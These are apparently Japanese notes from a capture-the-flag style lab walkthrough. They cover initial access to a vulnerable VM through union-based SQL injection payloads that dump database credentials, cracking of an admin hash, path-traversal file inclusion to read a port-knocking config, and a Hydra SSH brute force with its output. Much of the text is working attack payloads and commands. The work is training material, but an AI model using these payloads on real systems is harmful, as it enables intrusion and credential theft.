・Union Based SQL Injection

※Union Based SQL Injectionとは、unionを使い行を挿入することで内部情報を抜き取る手法です。

単純なクエリを投げてみる

' or 1=1  union select 1,2,3,4,5,6; #

![[Initial Access image 21.png]]

新しい行が追加されたことを確認

次に４，５,　６の部分を関数に変えてみる

' or 1=1  union select 1,2,3,user(),database(),version() ;#

![[Initial Access image 22.png]]

クエリを発行したユーザー、使用中のDatabase、DBのバージョンを出力できました。

スキーマの一覧を出力させます。

' or 1=1  union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata; #

![[Initial Access image 23.png]]

Staffに含まれるテーブル一覧を取得します。

' or 1=1  union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='Staff'; #

![[Initial Access image 24.png]]

StaffスキーマのUsersテーブルのカラムを取得します。

' or 1=1  union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='Users'; #

![[Initial Access image 25.png]]

UserID, Username, Passwordを取得します。

![[Initial Access image 26.png]]

admin

856f5de590ef37314e7c3bdf6f8a66dc

・クラック

![[Initial Access image 27.png]]

transorbital1

同様にユーザデータベースを調査

' or 1=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='users'; #

※information_schema.tablesからtable_schemaが'users'であるテーブル名を抽出しようとしているようです。

テーブルスキーマとはデータベース内のテーブルの構造や属性を定義する設計図のようなものです。具体的には、テーブルの列（フィールド）の名前、データ型、制約（例: NULL許容、一意性制約、外部キー制約など）などが含まれます。テーブルスキーマは、データベースのデータモデルやアプリケーションの要件に基づいて設計されます。テーブルスキーマを定義することで、データベース内でどのような情報が格納されるかが決定されます。

![[Initial Access image 28.png]]

UserDetails

' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='UserDetails'; #

![[Initial Access image 29.png]]

id,firstname,lastname,username,password,reg_date

' or 1=1 union select 1,2,3,group_concat(username),group_concat(password),6 from users.UserDetails; #

![[Initial Access image 30.png]]

marym,julied,fredf,barneyr,tomc,jerrym,wilmaf,bettyr,chandlerb,joeyt,rachelg,rossg,monicag,phoebeb,scoots,janitor,janitor2

3kfs86sfd,468sfdfsd2,4sfd87sfd1,RocksOff,TC&TheBoyz,B8m#48sd,Pebbles,BamBam01,UrAG0D!,Passw0rd,yN72#dsd,ILoveRachel,3248dsds7s,smellycats,YR3BVxxxw87,Ilovepeepee,Hawaii-Five-0

viでファイル内の,を改行に置換

:%s/,/\r/g

・ユーザー一覧の作成

![[Initial Access image 31.png]]

・パスワード一覧の作成

![[Initial Access image 32.png]]

adminでログイン

![[Initial Access image 33.png]]

![[Initial Access image 34.png]]

成功し、下のほうにFile does not exist

FILEという名前でLFIの脆弱性があるか調査

![[Initial Access image 35.png]]

成功

最初にnmapを実行したときのsshを再度調べる

22/tcp filtered ssh

ポートノッキングで開けないか、/etc/knockd.conf を調査

http://192.168.0.114/welcome.php?file=../../../../../etc/knockd.conf

![[Initial Access image 36.png]]

7469, 8475, 9842 の順番でknockすれば22番ポートを開けそう

knock 192.168.0.114 7469 8475 9842

もしくは

for port in {7469,8475,9842} ; do sudo nmap -Pn --max-retries 0 -p$port 192.168.0.114 > /dev/null 2>&1 ; done

成功

└─# hydra -L user.txt -P pass.txt 192.168.11.24 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-23 08:47:29

\[WARNING\] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

\[DATA\] max 16 tasks per 1 server, overall 16 tasks, 324 login tries (l:18/p:18), ~21 tries per task

\[DATA\] attacking ssh://192.168.11.24:22/

\[22\]\[ssh\] host: 192.168.11.24   login: chandlerb   password: UrAG0D!

\[22\]\[ssh\] host: 192.168.11.24   login: joeyt   password: Passw0rd

\[22\]\[ssh\] host: 192.168.11.24   login: janitor   password: Ilovepeepee

\[STATUS\] 305.00 tries/min, 305 tries in 00:01h, 21 to do in 00:01h, 14 active

1 of 1 target successfully completed, 3 valid passwords found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-23 08:48:36

![[Initial Access image 37.png]]